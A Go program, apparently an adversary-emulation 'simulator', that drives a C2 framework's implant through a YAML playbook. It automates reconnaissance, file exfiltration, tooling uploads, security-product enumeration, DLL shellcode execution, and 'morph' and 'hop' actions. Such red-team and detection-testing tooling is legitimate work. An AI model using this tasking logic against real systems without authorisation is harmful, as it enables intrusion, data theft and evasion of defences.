package main

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"github.com/faanross/numinon/internal/agent/config"
	"github.com/faanross/numinon/internal/clientapi"
	"github.com/faanross/numinon/internal/models"
	"github.com/faanross/numinon/internal/simula/plan"
	"github.com/faanross/numinon/internal/simula/scenarios"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"gopkg.in/yaml.v3"
	"io"
	"io/ioutil"
	"log"
	"math/rand"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"time"
)

var (
	playbookPath = flag.String("playbook", "", "Path to the simulation playbook YAML file")
	agentID      = flag.String("agent", "", "Target Agent ID for the simulation")
	serverURL    = flag.String("server", "ws://localhost:8080/client", "C2 server WebSocket API URL")
)

func main() {
	flag.Parse()

	// 1. Generate the log filename using the current timestamp.
	// The format "060102150405" corresponds to YYMMDDHHMMSS.
	timestamp := time.Now().Format("060102150405")
	logFileName := fmt.Sprintf("simulator_log_%s.log", timestamp)
	logFilePath := filepath.Join("tools", "simulator", "logs", logFileName)

	// 2. Ensure the logs directory exists.
	logDir := filepath.Dir(logFilePath)
	if err := os.MkdirAll(logDir, 0755); err != nil {
		log.Fatalf("Failed to create log directory: %v", err)
	}

	// 3. Open the newly generated log file.
	logFile, err := os.OpenFile(logFilePath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0666)
	if err != nil {
		log.Fatalf("Failed to open log file: %v", err)
	}
	defer logFile.Close()

	// 4. Create a multi-writer to log to both the console and the file.
	mw := io.MultiWriter(os.Stdout, logFile)
	log.SetOutput(mw)
	// --- END OF NEW LOGGING SETUP ---

	// The rest of the main function proceeds as before.
	log.Printf("Saving simulation log to: %s", logFilePath)

	// 2. Load the playbook
	simPlan, err := loadPlaybook(*playbookPath)
	if err != nil {
		log.Fatalf("Failed to load playbook: %v", err)
	}

	// 3. Connect to the C2 server
	interrupt := make(chan os.Signal, 1)
	signal.Notify(interrupt, os.Interrupt)
	conn, err := connectToC2()
	if err != nil {
		log.Fatalf("Failed to connect to C2 server: %v", err)
	}
	defer conn.Close()

	// 4. Keep connection alive between server <-> client
	// This keep-alive goroutine will run in the background.
	// Its only job is to service the connection to handle pings.
	go func() {
		for {
			// By continuously reading, we allow the underlying library
			// to process control frames like pings.
			if _, _, err := conn.ReadMessage(); err != nil {
				// If there's an error reading (like the connection closing),
				// we just log it and exit the goroutine.
				log.Printf("|KEEPALIVE| Read error, keep-alive stopping: %v", err)
				return
			}
		}
	}()

	// 5. Run the simulation
	log.Printf("Starting simulation for Agent '%s' using playbook '%s'. Press CTRL-C to stop.", *agentID, *playbookPath)
	runSimulation(conn, simPlan, interrupt)

	log.Println("Simulation finished.")
}

// loadPlaybook reads and parses the YAML file into our Go structs.
func loadPlaybook(path string) (*plan.SimulationPlan, error) {
	log.Printf("Loading playbook from %s...", path)
	yamlFile, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("failed to read playbook file: %w", err)
	}

	var simPlan plan.SimulationPlan
	err = yaml.Unmarshal(yamlFile, &simPlan)
	if err != nil {
		return nil, fmt.Errorf("failed to unmarshal playbook YAML: %w", err)
	}
	return &simPlan, nil
}

// connectToC2 establishes the WebSocket connection to the C2 server.
func connectToC2() (*websocket.Conn, error) {
	u, err := url.Parse(*serverURL)
	if err != nil {
		return nil, fmt.Errorf("error parsing server URL: %w", err)
	}
	log.Printf("Connecting to C2 server at %s...", u.String())
	conn, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		return nil, err
	}
	log.Println("Connected to C2 server.")
	return conn, nil
}

// runSimulation is the main engine loop that iterates through the playbook steps.
func runSimulation(conn *websocket.Conn, simPlan *plan.SimulationPlan, interrupt chan os.Signal) {
	for i, step := range simPlan.Plan {
		log.Printf("\n--- Step %d: %s ---", i+1, step.Name)

		// Check for interrupt signal before each step
		select {
		case <-interrupt:
			log.Println("Interrupt signal received. Stopping simulation.")
			return
		default:
			// Continue to the step if no interrupt is pending.
		}

		// The Action Dispatcher
		switch step.Action {
		case "sleep":
			d, err := time.ParseDuration(step.Duration)
			if err != nil {
				log.Printf("|❗ERR| Invalid duration '%s': %v. Skipping sleep.", step.Duration, err)
				continue
			}
			log.Printf("Action: sleep for %v... (Press CTRL-C to interrupt)", d)

			// --- MODIFIED LOGIC: Interruptible Sleep ---
			// Create a timer that will fire after the specified duration.
			timer := time.NewTimer(d)

			// Use a select statement to wait for EITHER the timer to fire
			// OR an interrupt signal to arrive.
			select {
			case <-timer.C:
				// The timer finished naturally.
				log.Println("...waking up.")
			case <-interrupt:
				// The user pressed CTRL-C during the sleep.
				log.Println("\nInterrupt signal received during sleep. Stopping simulation.")
				// It's good practice to stop the timer to release its resources.
				if !timer.Stop() {
					// This case handles a race condition where the timer fires at the
					// exact same moment as the interrupt. We drain the channel.
					<-timer.C
				}
				return // Exit the runSimulation function.
			}
			// --- END MODIFIED LOGIC ---

		case "run_cmd", "upload", "download", "enumerate", "shellcode", "morph", "hop":
			handleTaskingAction(conn, step)
		default:
			log.Printf("|⚠️ WARN| Unknown action '%s' in playbook. Skipping.", step.Action)
		}
	}
}

// handleTaskingAction is the "brain" of the simulator. It resolves the action
// (either from a category or explicit args) and sends the request.
func handleTaskingAction(conn *websocket.Conn, step plan.SimulationStep) {
	var specificArgs interface{}
	var apiAction string

	// This helper function performs the two-step marshal/unmarshal process
	// to convert the map from the YAML into a specific args struct.
	mapToArgsStruct := func(m map[string]interface{}, targetStruct interface{}) error {
		if m == nil {
			return fmt.Errorf("args map is nil")
		}
		jsonBytes, err := json.Marshal(m)
		if err != nil {
			return fmt.Errorf("failed to marshal intermediate args map: %w", err)
		}
		return json.Unmarshal(jsonBytes, targetStruct)
	}

	log.Printf("Action: %s (Category: '%s')", step.Action, step.Category)
	// --- Resolve Action Arguments (This logic is now complete and correct) ---
	switch step.Action {
	case "run_cmd":
		apiAction = string(clientapi.ActionTaskAgentRunCmd)
		if step.Category != "" {
			var cmd string
			if step.Category == "system_recon" {
				cmd = scenarios.GetRandom(scenarios.SystemReconCommands)
			}
			if step.Category == "network_recon" {
				cmd = scenarios.GetRandom(scenarios.NetworkReconCommands)
			}
			if step.Category == "user_recon" {
				cmd = scenarios.GetRandom(scenarios.UserReconCommands)
			}
			if step.Category == "discovery" {
				cmd = scenarios.GetRandom(scenarios.DiscoveryCommands)
			}
			log.Printf("Selected command from category '%s': %s", step.Category, cmd)
			specificArgs = models.RunCmdArgs{CommandLine: cmd}
		} else {
			var args models.RunCmdArgs
			if err := mapToArgsStruct(step.Args, &args); err != nil {
				log.Printf("|❗ERR|... %v", err)
				return
			}
			specificArgs = args
		}
	// ... other cases like upload, download, enumerate follow the same pattern ...
	case "upload":
		apiAction = string(clientapi.ActionTaskAgentUploadFile)
		if step.Category == "tooling" {
			// This part for category-based uploads is already correct and remains unchanged.
			preset := scenarios.ToolingUploads[rand.Intn(len(scenarios.ToolingUploads))]
			sourcePath := filepath.Join("tools", "simulator", "dummy_files", preset.DummyFileName)
			destDir := scenarios.GetRandom(preset.PlausibleTargetDirs)
			log.Printf("Selected upload preset: '%s' to '%s'", preset.DummyFileName, destDir)
			content, err := os.ReadFile(sourcePath)
			if err != nil {
				log.Printf("|❗ERR| Failed to read dummy file %s: %v", sourcePath, err)
				return
			}
			hasher := sha256.New()
			hasher.Write(content)
			specificArgs = models.UploadArgs{
				TargetDirectory:   destDir,
				TargetFilename:    preset.DummyFileName,
				FileContentBase64: base64.StdEncoding.EncodeToString(content),
				ExpectedSha256:    hex.EncodeToString(hasher.Sum(nil)),
				OverwriteIfExists: true,
			}
		} else {
			// --- THIS IS THE CORRECTED LOGIC FOR MANUAL UPLOADS ---
			log.Println("Processing manual upload from playbook args...")

			// Extract arguments from the YAML map
			localPath, ok := step.Args["local_server_path"].(string)
			if !ok || localPath == "" {
				log.Printf("|❗ERR| Manual upload action requires 'local_server_path' in args. Skipping.")
				return
			}

			destDir, ok := step.Args["target_dir"].(string)
			if !ok || destDir == "" {
				log.Printf("|❗ERR| Manual upload action requires 'target_dir' in args. Skipping.")
				return
			}

			destFile, ok := step.Args["target_file"].(string)
			if !ok || destFile == "" {
				log.Printf("|❗ERR| Manual upload action requires 'target_file' in args. Skipping.")
				return
			}

			// The Simulator now performs the file reading and encoding, just like the task_cli.
			content, err := ioutil.ReadFile(localPath)
			if err != nil {
				log.Printf("|❗ERR| Failed to read local file '%s' for upload: %v", localPath, err)
				return
			}

			hasher := sha256.New()
			hasher.Write(content)

			log.Printf("Prepared manual upload: '%s' -> '%s\\%s'", localPath, destDir, destFile)

			specificArgs = models.UploadArgs{
				TargetDirectory:   destDir,
				TargetFilename:    destFile,
				FileContentBase64: base64.StdEncoding.EncodeToString(content),
				ExpectedSha256:    hex.EncodeToString(hasher.Sum(nil)),
				OverwriteIfExists: true,
			}
			// --- END OF CORRECTED LOGIC ---
		}
	case "download":
		apiAction = string(clientapi.ActionTaskAgentDownloadFile)
		if step.Category != "" {
			var path string
			if step.Category == "system_files" {
				path = scenarios.GetRandom(scenarios.ExfilSystemFiles)
			}
			if step.Category == "user_files" {
				path = scenarios.GetRandom(scenarios.ExfilUserFiles)
			}
			log.Printf("Selected download path from category '%s': %s", step.Category, path)
			specificArgs = models.DownloadArgs{SourceFilePath: path}
		} else {
			var args models.DownloadArgs
			if err := mapToArgsStruct(step.Args, &args); err != nil {
				log.Printf("|❗ERR|... %v", err)
				return
			}
			specificArgs = args
		}
	case "enumerate":
		apiAction = string(clientapi.ActionTaskAgentEnumerateProcs)
		if step.Category != "" {
			var procName string
			if step.Category == "security_products" {
				procName = scenarios.GetRandom(scenarios.SecurityProductProcesses)
			}
			if step.Category == "remote_access" {
				procName = scenarios.GetRandom(scenarios.RemoteAccessProcesses)
			}
			log.Printf("Selected process to enumerate from category '%s': '%s'", step.Category, procName)
			specificArgs = models.EnumerateArgs{ProcessName: procName}
		} else {
			var args models.EnumerateArgs
			if err := mapToArgsStruct(step.Args, &args); err != nil {
				log.Printf("|❗ERR|... %v", err)
				return
			}
			specificArgs = args
		}
	case "morph":
		apiAction = string(clientapi.ActionTaskAgentMorph)
		var args models.MorphArgs
		if err := mapToArgsStruct(step.Args, &args); err != nil {
			log.Printf("|❗ERR|... %v", err)
			return
		}
		specificArgs = args
	case "hop":
		apiAction = string(clientapi.ActionTaskAgentHop)
		var args models.HopArgs
		if err := mapToArgsStruct(step.Args, &args); err != nil {
			log.Printf("|❗ERR|... %v", err)
			return
		}
		specificArgs = args
	case "shellcode":
		apiAction = string(clientapi.ActionTaskAgentExecuteShellcode)
		log.Println("Processing manual shellcode execution from playbook args...")

		// Extract arguments from the YAML map
		localPath, ok := step.Args["local_dll_path"].(string)
		if !ok || localPath == "" {
			log.Printf("|❗ERR| Shellcode action requires 'local_dll_path' in args. Skipping.")
			return
		}

		exportName, ok := step.Args["export_name"].(string)
		if !ok || exportName == "" {
			log.Printf("|❗ERR| Shellcode action requires 'export_name' in args. Skipping.")
			return
		}

		// The Simulator now reads the DLL and Base64 encodes it.
		dllBytes, err := ioutil.ReadFile(localPath)
		if err != nil {
			log.Printf("|❗ERR| Failed to read local DLL file '%s' for shellcode execution: %v", localPath, err)
			return
		}

		log.Printf("Prepared shellcode from '%s' using export '%s'", localPath, exportName)

		specificArgs = models.ShellcodeArgs{
			ShellcodeBase64: base64.StdEncoding.EncodeToString(dllBytes),
			ExportName:      exportName,
		}
	}

	if specificArgs == nil {
		log.Printf("|❗ERR| Could not determine arguments for step '%s'. Skipping.", step.Name)
		return
	}

	// --- Build and Send Request ---
	specificArgsBytes, _ := json.Marshal(specificArgs)
	taskPayload := clientapi.TaskAgentPayload{AgentID: *agentID, Args: specificArgsBytes}
	taskPayloadBytes, _ := json.Marshal(taskPayload)
	opRequest := clientapi.ClientRequest{
		RequestID: "sim_req_" + uuid.NewString()[:8],
		Action:    clientapi.ActionType(apiAction),
		Payload:   taskPayloadBytes,
	}
	reqBytes, _ := json.Marshal(opRequest)

	log.Printf("Sending task '%s' to server...", opRequest.Action)
	if err := conn.WriteMessage(websocket.TextMessage, reqBytes); err != nil {
		log.Printf("|❗ERR| Failed to send request: %v", err)
		return
	}

	// --- Wait for Final Result ---
	log.Printf("Waiting for final result for request %s (timeout: 20 mins)...", opRequest.RequestID)
	timeout := time.After(20 * time.Minute)
	for {
		select {
		case <-timeout:
			log.Printf("|⚠️ WARN| Timeout waiting for final result for request %s.", opRequest.RequestID)
			return
		default:
			conn.SetReadDeadline(time.Now().Add(20 * time.Minute))
			_, msg, err := conn.ReadMessage()
			if err != nil {
				log.Printf("|⚠️ WARN| Error while waiting for result: %v", err)
				return
			}

			var resp clientapi.ServerResponse
			if err := json.Unmarshal(msg, &resp); err != nil {
				log.Printf("|⚠️ WARN| Could not unmarshal server message: %v", err)
				continue // Keep waiting
			}

			// Is this the message we're waiting for?
			if resp.RequestID == opRequest.RequestID {
				if string(resp.Action) == string(clientapi.EventTypeTaskResult) {
					log.Println("Received final task result from server!")
					logFinalResult(resp.Payload, step.Action)
					return // Success! Our work for this step is done.
				} else {
					log.Printf("Received server acknowledgment: Status '%s'", resp.Status)
					// This is the 'Pending' status, so we continue waiting.
				}
			}
		}
	}
}

// logFinalResult is a new helper function to pretty-print the result payload.
func logFinalResult(resultPayload json.RawMessage, originalAction string) {
	var taskResult models.AgentTaskResult
	if err := json.Unmarshal(resultPayload, &taskResult); err != nil {
		log.Printf("|❗ERR| Failed to unmarshal TaskResult from final response: %v", err)
		return
	}

	log.Println("--- Final Agent Result ---")
	log.Printf("  Task ID: %s", taskResult.TaskID)
	log.Printf("  Status: %s", taskResult.Status)
	if taskResult.Error != "" {
		log.Printf("  Agent Error: %s", taskResult.Error)
	}

	log.Println("  Output:")
	if len(taskResult.Output) > 0 {
		// Custom printing based on original action
		switch originalAction {
		case "download":
			log.Printf("    <Success! Received %d bytes of base64-encoded file content.>", len(taskResult.Output))
			if taskResult.FileSha256 != "" {
				log.Printf("    <Agent-calculated SHA256: %s>", taskResult.FileSha256)
			}
		case "report_config":
			var agentConfig config.AgentConfig
			json.Unmarshal(taskResult.Output, &agentConfig)
			yamlBytes, _ := yaml.Marshal(agentConfig)
			log.Printf("\n--- Agent Config ---\n%s\n--------------------", string(yamlBytes))
		default:
			// For most commands, just print the output as a string.
			log.Printf("\n%s", string(taskResult.Output))
		}
	} else {
		log.Println("    <No output from agent>")
	}
	log.Println("--------------------------")
}
